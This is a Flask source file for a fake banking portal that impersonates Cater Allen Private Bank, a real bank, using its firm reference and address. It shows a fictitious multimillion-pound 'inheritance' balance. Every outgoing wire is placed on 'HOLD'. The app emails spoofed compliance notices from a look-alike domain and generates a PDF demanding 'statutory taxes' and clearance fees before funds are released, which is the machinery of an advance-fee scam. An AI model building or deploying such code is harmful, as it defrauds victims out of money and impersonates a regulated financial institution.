import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8')

import os
import json
import requests
import time
import random
from datetime import datetime, timedelta
import gspread
from flask import Flask, jsonify, redirect, render_template, request, session, url_for
from oauth2client.service_account import ServiceAccountCredentials
import resend

app = Flask(__name__)
app.secret_key = 'vertex_vault_private_access_2026'
app.permanent_session_lifetime = timedelta(seconds=240)
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 86400

# Configure Resend API Key
resend.api_key = os.environ.get('RESEND_API_KEY')

@app.before_request
def make_session_permanent():
    session.permanent = True

@app.after_request
def add_static_cache_headers(response):
    """Cache static assets for 24 hours to reduce repeat load time."""
    if request.path.startswith('/static/') and response.status_code == 200:
        response.cache_control.public = True
        response.cache_control.max_age = 86400
    return response

# --- Google Sheets Setup ---
SCOPE = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
credentials_json = os.environ.get('GOOGLE_CREDENTIALS')
credentials_dict = json.loads(credentials_json)
CREDS = ServiceAccountCredentials.from_json_keyfile_dict(credentials_dict, SCOPE)
CLIENT = gspread.authorize(CREDS)
SHEET = CLIENT.open('vertex Bank ').worksheet('Users')
BALANCES_SHEET = CLIENT.open('vertex Bank ').worksheet('Balances')
LOGS_SHEET = CLIENT.open('vertex Bank ').worksheet('Activity_logs')

# --- The Central Ledger (Stored in Memory) ---
bank_data = {
    "user": {
        "email": "Lydiabrooke950447@gmail.com",
        "name": "LYDIA BROOKE DAINA",
        "pwd": "Myinheritanceaccount2026",
        "balance": 24967500.00,
        "status": "Private Client Tier"
    },
    "history": []
}


def get_sheet_balance():
    """Calculate live balance automatically by summing up all transaction amounts in the Balances worksheet."""
    try:
        rows = BALANCES_SHEET.get_all_values()
        if not rows or len(rows) <= 1:
            return 0.00
        
        total_balance = 0.00
        for row in rows[1:]:
            if len(row) >= 3 and row[2]:
                try:
                    amt_str = str(row[2]).replace('£', '').replace('$', '').replace(',', '').strip()
                    total_balance += float(amt_str)
                except ValueError:
                    pass
        return total_balance
    except Exception as e:
        print(f"❌ Balance calculation error: {e}")
        return 0.00

def get_transaction_history():
    """Fetch transaction history from Balances worksheet."""
    try:
        rows = BALANCES_SHEET.get_all_values()
        if not rows or len(rows) <= 1:
            return []
            
        transactions = []
        for row in rows[1:]:
            if not row or len(row) < 2 or not str(row[1]).strip():
                continue
            try:
                amt_str = str(row[2]).replace('£', '').replace('$', '').replace(',', '').strip()
                row_amount = float(amt_str) if amt_str else 0.0
            except ValueError:
                row_amount = 0.0
                
            transactions.append({
                "date": row[0],
                "description": row[1],
                "amount": row_amount,
                "ref": row[3] if len(row) > 3 else '',
                "status": row[4] if len(row) > 4 else 'COMPLETED'
            })
        return list(reversed(transactions))
    except Exception as e:
        print(f"❌ History fetch error: {e}")
        return []


def send_wire_hold_notification(recipient_email, recipient_name, amount, currency, reference):
    """Sends a professional institutional compliance hold notification via Resend API."""
    try:
        html_content = f"""
        <div style="font-family: 'Inter', Arial, sans-serif; background-color: #f4f6f9; padding: 30px; color: #1e293b;">
            <div style="max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 12px; overflow: hidden; border: 1px solid #e2e8f0; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
                
                <!-- Institutional Header -->
                <div style="background-color: #002147; padding: 24px; text-align: left;">
                    <h2 style="color: #ffffff; margin: 0; font-size: 18px; font-weight: 700; letter-spacing: 0.5px;">CATER ALLEN PRIVATE BANK</h2>
                    <p style="color: #94a3b8; margin: 5px 0 0 0; font-size: 12px;">Institutional Wire Services & Compliance Division</p>
                </div>
                
                <!-- Body Content -->
                <div style="padding: 30px;">
                    <p style="font-size: 15px; font-weight: 600; color: #0f172a;">Dear {recipient_name},</p>
                    
                    <p style="font-size: 14px; line-height: 1.6; color: #475569;">
                        We are writing to formally notify you regarding an incoming international wire transfer initiated from a <strong>Cater Allen Private Bank</strong> account.
                    </p>
                    
                    <!-- Transaction Summary Box -->
                    <div style="background-color: #f8fafc; border-left: 4px solid #002147; padding: 16px; margin: 20px 0; border-radius: 4px;">
                        <p style="margin: 0 0 8px 0; font-size: 13px; color: #64748b;"><strong>Sender:</strong> Lydia Brooke (UK Carter Allen Account)</p>
                        <p style="margin: 0 0 8px 0; font-size: 13px; color: #64748b;"><strong>Amount Processed:</strong> {currency} {amount:,.2f}</p>
                        <p style="margin: 0 0 8px 0; font-size: 13px; color: #64748b;"><strong>Reference ID:</strong> {reference}</p>
                        <p style="margin: 0; font-size: 13px; color: #d97706;"><strong>Status:</strong> <span style="font-weight: 600; color: #d97706;">PENDING / ON HOLD</span></p>
                    </div>
                    
                    <p style="font-size: 14px; line-height: 1.6; color: #475569;">
                        Please note that while the funds have been successfully debited and processed from the sender's vault, the transfer is currently placed <strong>on temporary administrative hold</strong> pending clearance of statutory regulatory taxes. 
                    </p>
                    
                    <p style="font-size: 14px; line-height: 1.6; color: #475569;">
                        Once the statutory compliance verification is cleared by the institution, the funds will be immediately released to your designated beneficiary institution.
                    </p>
                    
                    <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 25px 0;" />
                    
                    <p style="font-size: 12px; color: #94a3b8; line-height: 1.5; margin: 0;">
                        This is an automated compliance notification from Cater Allen Private Bank. Please do not reply directly to this email. For inquiries, contact your relationship manager or institutional support.
                    </p>
                </div>
            </div>
        </div>
        """

        params = {
            "from": "Cater Allen Private Bank <support@carter-allen-banking.app>",
            "to": [recipient_email],
            "subject": f"Compliance Notice: Incoming Wire Transfer Hold - {currency} {amount:,.2f}",
            "html": html_content,
        }

        email_response = resend.Emails.send(params)
        print(f"✅ Wire notification email sent successfully: {email_response}")
    except Exception as e:
        print(f"❌ Failed to send wire email notification: {e}")


@app.route('/')
def home():
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email = request.form.get('email')
        pwd = request.form.get('password')
        
        if email == bank_data["user"]["email"] and pwd == bank_data["user"]["pwd"]:
            otp_code = f"{random.randint(100000, 999999)}"
            
            if LOGS_SHEET:
                try:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
                    action = "2FA GENERATED"
                    details = f"Code: {otp_code} for {email}"
                    LOGS_SHEET.append_row([timestamp, action, details])
                except Exception as e:
                    print(f"❌ Sheet Error: {e}")
            
            session['pending_user'] = email
            session['pending_otp'] = otp_code
            return redirect(url_for('verify_2fa'))

        error = "Invalid Bank ID or Password. Please check your credentials."

    return render_template('login.html', error=error)


@app.route('/verify_2fa', methods=['GET', 'POST'])
def verify_2fa():
    if 'pending_user' not in session:
        return redirect(url_for('login'))
        
    error = None
    if request.method == 'POST':
        entered_code = request.form.get('otp_code')
        if str(entered_code).strip() == str(session.get('pending_otp')).strip():
            time.sleep(random.uniform(1.0, 2.0))
            session['user'] = session.pop('pending_user')
            session.pop('pending_otp', None)
            return redirect(url_for('dashboard'))
        else:
            error = "Invalid authorization code. Please contact the administrator."
            
    return render_template('verify_2fa.html', error=error)


@app.route('/back-to-login')
def back_to_login():
    session.pop('pending_user', None)
    session.pop('pending_otp', None)
    return redirect(url_for('login'))


@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    live_balance = get_sheet_balance()
    transactions = get_transaction_history()
    return render_template(
        'dashboard.html',
        user=bank_data["user"],
        history=transactions,
        live_balance=live_balance,
        transactions=transactions,
    )


# --- Public Landing Pages & Intelligence ---

@app.route('/about')
def about():
    return render_template('about.html')


@app.route('/news')
def news():
    articles = [
        {
            "id": 1, 
            "title": "Cater Allen Expands Multi-Currency Wealth Vault Services", 
            "date": "Oct 01, 2026", 
            "summary": "Enhancing global liquidity solutions and multi-jurisdictional settlements across GBP, EUR, USD, and CHF for high-net-worth private clients."
        },
        {
            "id": 2, 
            "title": "UK Private Banking Regulatory Updates: FSCS Protection Limits", 
            "date": "Sep 28, 2026", 
            "summary": "Understanding eligible deposit protection up to £85,000 under the Financial Services Compensation Scheme and asset structuring."
        },
        {
            "id": 3, 
            "title": "Lombard Lending Strategies in High-Interest Rate Environments", 
            "date": "Sep 22, 2026", 
            "summary": "How private clients leverage existing equity and treasury portfolios to fund prime real estate acquisitions without liquidating holdings."
        },
        {
            "id": 4, 
            "title": "Secure Digital Onboarding & Multi-Layered Authentication Protocols", 
            "date": "Sep 15, 2026", 
            "summary": "How Cater Allen maintains institutional-grade security infrastructure against emerging cyber threats through hardware tokens and 2FA."
        },
        {
            "id": 5, 
            "title": "Global Tech Equities Outlook: Tesla, NVIDIA, and Mega-Cap Resilience", 
            "date": "Sep 10, 2026", 
            "summary": "An in-depth portfolio review by our wealth advisory desk analyzing artificial intelligence infrastructure and EV market dynamics."
        },
        {
            "id": 6, 
            "title": "Generational Wealth Planning & SIPP Trust Administration", 
            "date": "Sep 04, 2026", 
            "summary": "Structuring Self-Invested Personal Pensions (SIPPs) to compound tax-efficient returns across multi-generational family trusts."
        },
        {
            "id": 7, 
            "title": "Gold Bullion Reserves and Safe-Haven Hedging Amid Geopolitical Shifts", 
            "date": "Aug 29, 2026", 
            "summary": "Examining the role of physical and allocated gold holdings in safeguarding family office liquidity during market volatility."
        },
        {
            "id": 8, 
            "title": "Corporate Treasury Solutions: Optimizing Yields on Commercial Liquidity", 
            "date": "Aug 20, 2026", 
            "summary": "Bespoke short-term deposit accounts and treasury bond access engineered for corporate entities requiring high-yield security."
        }
    ]
    return render_template('news.html', articles=articles)


@app.route('/news/<int:article_id>')
def news_detail(article_id):
    articles = {
        1: {
            "title": "Cater Allen Expands Multi-Currency Wealth Vault Services", 
            "date": "Oct 01, 2026", 
            "content": "Cater Allen Private Bank has announced extended features for its Multi-Currency Wealth Vault, allowing clients to seamlessly hold and manage GBP, EUR, USD, and CHF. Designed for international families and businesses, this expansion reinforces our commitment to institutional settlement precision, flexibility, and high-touch private client service."
        },
        2: {
            "title": "UK Private Banking Regulatory Updates: FSCS Protection Limits", 
            "date": "Sep 28, 2026", 
            "content": "As part of our standard regulatory compliance and dedication to asset safety, all eligible deposits placed with Cater Allen continue to receive comprehensive protection up to £85,000 under the UK's Financial Services Compensation Scheme (FSCS). Our private banking advisors remain available to discuss asset structuring options."
        },
        3: {
            "title": "Lombard Lending Strategies in High-Interest Rate Environments", 
            "date": "Sep 22, 2026", 
            "content": "Lombard lending enables private clients to borrow against their investment portfolios without triggering capital gains tax events. Our wealth advisory team reviews optimal loan-to-value (LTV) ratios for real estate and business expansion."
        },
        4: {
            "title": "Secure Digital Onboarding & Multi-Layered Authentication Protocols", 
            "date": "Sep 15, 2026", 
            "content": "Security remains paramount in private banking. Our latest platform updates introduce multi-layered 2FA validation protocols, encrypted messaging channels, and advanced hardware token integrations to safeguard client assets against emerging digital threats."
        },
        5: {
            "title": "Global Tech Equities Outlook: Tesla, NVIDIA, and Mega-Cap Resilience", 
            "date": "Sep 10, 2026", 
            "content": "Technology equities continue to drive benchmark performance. Our analysts examine Tesla's autonomous delivery scaling alongside semiconductor demand for NVIDIA and Microsoft cloud expansion."
        },
        6: {
            "title": "Generational Wealth Planning & SIPP Trust Administration", 
            "date": "Sep 04, 2026", 
            "content": "Preserving wealth across generations requires careful trust structures. Self-Invested Personal Pensions (SIPPs) offer significant tax advantages when integrated into family estate planning."
        },
        7: {
            "title": "Gold Bullion Reserves and Safe-Haven Hedging Amid Geopolitical Shifts", 
            "date": "Aug 29, 2026", 
            "content": "Allocated gold bullion serves as a foundational store of value during macroeconomic uncertainty. We explore vault storage options across London and Zurich."
        },
        8: {
            "title": "Corporate Treasury Solutions: Optimizing Yields on Commercial Liquidity", 
            "date": "Aug 20, 2026", 
            "content": "Corporate clients with substantial cash reserves benefit from bespoke treasury management, balancing immediate liquidity needs with secure yield generation."
        }
    }
    article = articles.get(article_id, {"title": "Article Not Found", "date": "", "content": "The requested publication could not be located."})
    return render_template('news_detail.html', article=article)


@app.route('/contact')
def contact():
    return render_template('contact.html')


@app.route('/api/support-chat', methods=['POST'])
def support_chat():
    msg = request.json.get('message', '').lower()
    
    if any(k in msg for k in ['call', 'email', 'speak', 'human', 'agent', 'contact', 'reach', 'support', 'help', 'manager', 'phone']):
        reply = "Your request and portfolio details have been successfully submitted to our client relations department at our London headquarters. A dedicated Cater Allen relationship manager has been assigned to your file and will contact you via secure phone call or registered email shortly."
    elif any(k in msg for k in ['wire', 'transfer', 'send money', 'hold', 'tax', 'fees']):
        reply = "Wire transfers and liquidity settlements are governed by our multi-layered 2FA protocols and statutory compliance checks. If your transfer is currently on hold, our compliance desk is reviewing the transaction reference. Would you like me to submit an immediate priority review request to your relationship manager?"
    elif any(k in msg for k in ['balance', 'liquidity', 'funds', 'deposit']):
        reply = "Your live account balance reflects dynamic real-time ledger synchronization with your designated vault sheet. You can verify your live liquidity directly on your dashboard."
    elif any(k in msg for k in ['fscs', 'safe', 'secure', 'regulated', 'protection']):
        reply = "Cater Allen is authorized by the PRA and regulated by the FCA and PRA (Firm Reference 178737). Eligible client deposits are fully protected up to £85,000 under the Financial Services Compensation Scheme (FSCS)."
    else:
        reply = f"Thank you for your message regarding '{msg}'. Our wealth advisory systems have noted your query. If you would like a relationship manager to personally call or email you regarding this matter, simply let me know and I will submit your request immediately."
        
    return jsonify({"reply": reply})


@app.route('/apply_card', methods=['POST'])
def apply_card():
    if 'user' not in session:
        return redirect(url_for('login'))
    card_type = request.form.get('card_type', 'Visa Infinite')
    ref_id = f"CRD-{random.randint(10000, 99999)}"
    try:
        BALANCES_SHEET.append_row([
            datetime.now().strftime("%b %d, %Y"),
            f"DEBIT CARD APPLICATION - {card_type.upper()}",
            "0.00",
            ref_id,
            "PROCESSING"
        ])
    except Exception as e:
        print(f"❌ Card app log error: {e}")
    return redirect(url_for('dashboard'))


@app.route('/process_deposit', methods=['POST'])
def process_deposit():
    if 'user' not in session:
        return redirect(url_for('login'))
    
    amount_raw = request.form.get('deposit_amount', '0')
    method = request.form.get('deposit_method', 'Card Deposit')
    try:
        amount = float(amount_raw)
    except:
        amount = 0.0

    if amount > 0:
        ref_id = f"DEP-{random.randint(1000, 9999)}"
        BALANCES_SHEET.append_row([
            datetime.now().strftime("%b %d, %Y"),
            f"DEPOSIT VIA {method.upper()}",
            f"+{amount:.2f}",
            ref_id,
            "COMPLETED"
        ])

    return redirect(url_for('dashboard'))


@app.route('/execute_wire', methods=['POST'])
def execute_wire():
    if 'user' not in session:
        return redirect(url_for('login'))
        
    beneficiary = request.form.get('wire_beneficiary', 'Valued Client')
    bank = request.form.get('wire_institution', 'Global Bank')
    country = request.form.get('wire_country', 'UK')
    address = request.form.get('wire_address', '')
    city = request.form.get('wire_city', '')
    postal = request.form.get('wire_postal', '')
    email = request.form.get('wire_recipient_email', '')
    routing = request.form.get('wire_routing', 'N/A')
    swift = request.form.get('wire_swift', '')
    clearing = request.form.get('wire_clearing', '')
    account = request.form.get('wire_account', 'N/A')
    
    amount_raw = request.form.get('wire_amount', '0')
    try:
        amount = float(amount_raw)
    except:
        amount = 0.0

    current_balance = get_sheet_balance()
    
    if amount > current_balance:
        return render_template(
            'dashboard.html',
            user=bank_data["user"],
            history=get_transaction_history(),
            live_balance=current_balance,
            transactions=get_transaction_history(),
            error="Insufficient funds available in your vault to complete this wire transfer."
        )

    ref_id = f"VX-{random.randint(1000, 9999)}"
    transaction_date = datetime.now().strftime("%b %d, %Y")
    
    swift_part = f" | SWIFT: {swift}" if swift else ""
    clearing_part = f" | Clearing: {clearing}" if clearing else ""
    details_str = f"WIRE TO {beneficiary} ({bank}, {country}) | Routing: {routing}{swift_part}{clearing_part} | ACCT: {account}"
    
    BALANCES_SHEET.append_row([
        transaction_date, 
        details_str, 
        f"-{amount:.2f}", 
        ref_id, 
        "HOLD"
    ])

    # Trigger Resend email notification automatically
    if email and "@" in email:
        send_wire_hold_notification(
            recipient_email=email,
            recipient_name=beneficiary,
            amount=amount,
            currency='GBP',
            reference=ref_id
        )

    return render_template('success.html', beneficiary=beneficiary, amount=amount, status="HOLD")


import io
from flask import send_file
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors

@app.route('/download-compliance-report')
def download_compliance_report():
    if 'user' not in session:
        return redirect(url_for('login'))

    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter, rightMargin=40, leftMargin=40, topMargin=40, bottomMargin=40)
    story = []
    styles = getSampleStyleSheet()

    # Custom Styles
    title_style = ParagraphStyle(
        'DocTitle',
        parent=styles['Heading1'],
        fontName='Helvetica-Bold',
        fontSize=14,
        textColor=colors.HexColor('#002147'),
        alignment=1,
        spaceAfter=4
    )
    subtitle_style = ParagraphStyle(
        'DocSubtitle',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=9,
        textColor=colors.HexColor('#64748b'),
        alignment=1,
        spaceAfter=15
    )
    heading_style = ParagraphStyle(
        'SectionHeading',
        parent=styles['Heading2'],
        fontName='Helvetica-Bold',
        fontSize=10,
        textColor=colors.HexColor('#002147'),
        spaceBefore=10,
        spaceAfter=4
    )
    body_style = ParagraphStyle(
        'BodyDark',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=9,
        textColor=colors.HexColor('#1e293b'),
        leading=13,
        spaceAfter=8
    )

    # Document Header
    story.append(Paragraph("CATER ALLEN PRIVATE BANK UK", title_style))
    story.append(Paragraph("OFFICIAL COMPLIANCE & REGULATORY MEMORANDUM", subtitle_style))
    story.append(Spacer(1, 5))

    # Account metadata table
    data = [
        [Paragraph("<b>Client Name:</b> Lydia Brooke Daina", body_style), Paragraph(f"<b>Date:</b> {datetime.now().strftime('%b %d, %Y')}", body_style)],
        [Paragraph("<b>Account Number:</b> GB84 CATER •••• 0447", body_style), Paragraph("<b>Classification:</b> Private Client Tier", body_style)],
        [Paragraph("<b>Status:</b> Mandatory Compliance Hold", body_style), Paragraph("<b>Jurisdiction:</b> United Kingdom (FCA / PRA Regulated)", body_style)]
    ]
    t = Table(data, colWidths=[270, 270])
    t.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), colors.HexColor('#f8fafc')),
        ('BOX', (0,0), (-1,-1), 1, colors.HexColor('#cbd5e1')),
        ('INNERGRID', (0,0), (-1,-1), 0.5, colors.HexColor('#e2e8f0')),
        ('TOPPADDING', (0,0), (-1,-1), 6),
        ('BOTTOMPADDING', (0,0), (-1,-1), 6),
        ('LEFTPADDING', (0,0), (-1,-1), 8),
        ('RIGHTPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(t)
    story.append(Spacer(1, 15))

    # Section 1
    story.append(Paragraph("1. Executive Notice of Transaction Interception & Security Hold", heading_style))
    story.append(Paragraph(
        "This official memorandum serves as formal notification that recent outgoing wire transfers and liquidity withdrawal requests originating from your Cater Allen Private Wealth Vault have been intercepted and placed on a <b>Mandatory Compliance Hold</b> by the institutional settlement gateway.",
        body_style
    ))

    # Section 2
    story.append(Paragraph("2. UK Government Statutory Account Taxation & Clearance", heading_style))
    story.append(Paragraph(
        "In strict compliance with UK fiscal regulations, Her Majesty's Revenue and Customs (HMRC) statutory frameworks, and anti-money laundering (AML) compliance mandates under the Financial Services and Markets Act, high-value asset holdings and cross-border settlements are subject to mandatory capital clearance assessments.",
        body_style
    ))
    story.append(Paragraph(
        "<b>Directive:</b> Outstanding <b>Statutory Account Taxes / Fiscal Clearance Fees</b> must be formally settled and reconciled against the account ledger. Outgoing wire transfers, third-party bill payments, and liquidity withdrawals will remain restricted until the compliance desk validates the statutory tax payment receipt.",
        body_style
    ))

    # Section 3
    story.append(Paragraph("3. Quarterly Account Maintenance & Custody Administration Charges", heading_style))
    story.append(Paragraph(
        "Pursuant to Cater Allen Private Bank institutional terms of service and wealth management agreements, composite asset vaults incur mandatory administrative maintenance charges every <b>three (3) months</b>. These recurring fees cover secure SWIFT routing infrastructure, multi-jurisdictional currency custody, and mandated regulatory auditing.",
        body_style
    ))
    story.append(Paragraph(
        "Failure to maintain positive clearing liquidity covering quarterly maintenance schedules alongside statutory tax obligations may result in temporary account suspension or referral to the UK Financial Conduct Authority (FCA) compliance review board.",
        body_style
    ))

    # Section 4
    story.append(Paragraph("4. Next Steps for Account Unblocking", heading_style))
    story.append(Paragraph(
        "To clear this security hold and restore full automated functionality to your account, please contact your designated relationship manager or submit the statutory clearance remittance through your secure banking portal.",
        body_style
    ))
    
    story.append(Spacer(1, 20))
    story.append(Paragraph("<font size=7 color='#64748b'>Cater Allen Private Bank • Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority (Firm Reference Number 178737). Registered Office: 2 Triton Square, Regent's Place, London, NW1 3AN. This is a system-generated secure banking document.</font>", body_style))

    doc.build(story)
    buffer.seek(0)
    
    return send_file(
        buffer,
        as_attachment=True,
        download_name="Cater_Allen_Compliance_Notice.pdf",
        mimetype='application/pdf'
    )


@app.route('/chat', methods=['POST'])
def chat():
    msg = request.json.get('message', '').lower()
    live_balance = get_sheet_balance()
    if 'balance' in msg:
        res = f"Your current liquidity is £{live_balance:,.2f}."
    elif 'limit' in msg:
        res = "Your elite daily transfer limit is currently set to £10,000,000.00 GBP."
    else:
        res = "I am the Cater Allen Concierge. How can I assist with your private assets today?"
    return jsonify({"reply": res})


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/statement')
def statement():
    if 'user' not in session:
        return redirect(url_for('login'))
    
    all_transactions = get_transaction_history()
    deposits = []
    for txn in all_transactions:
        amt = txn.get('amount', 0.0)
        if amt > 0:
            deposits.append(txn)
            
    live_balance = get_sheet_balance()
    return render_template('statement.html', user=bank_data["user"], deposits=deposits, live_balance=live_balance)


@app.route('/loans')
def loans():
    return render_template('loans.html', user=bank_data["user"])


@app.route('/investments')
@app.route('/investment')
def investment():
    return render_template('investment.html', user=bank_data["user"])


@app.route('/savings')
def savings():
    return render_template('frozen.html', user=bank_data["user"])


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)